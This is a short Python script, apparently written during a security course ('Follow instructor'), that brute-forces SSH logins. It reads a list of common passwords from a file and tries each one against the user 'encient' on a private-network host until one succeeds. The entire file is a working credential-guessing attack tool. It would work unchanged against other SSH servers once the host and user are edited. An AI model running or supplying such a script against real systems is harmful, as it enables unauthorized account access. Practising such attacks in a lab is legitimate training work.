# Second attempt
# Follow instructor

from pwn import *
import paramiko

host = "172.16.90.143"
username = "encient"

with open("ssh-common-passwords.txt", "r") as password_list:
	
	for password in password_list:
		password = password.strip("\n")

		try:
			print("[>] Attempting password: '{}'".format(password))
			response = ssh(host=host, user=username, password=password)

			if response.connected():
				print("Valid password: '{}'".format(password))
				response.close()
				break

		except paramiko.ssh_exception.AuthenticationException:
			print("Invalid password.")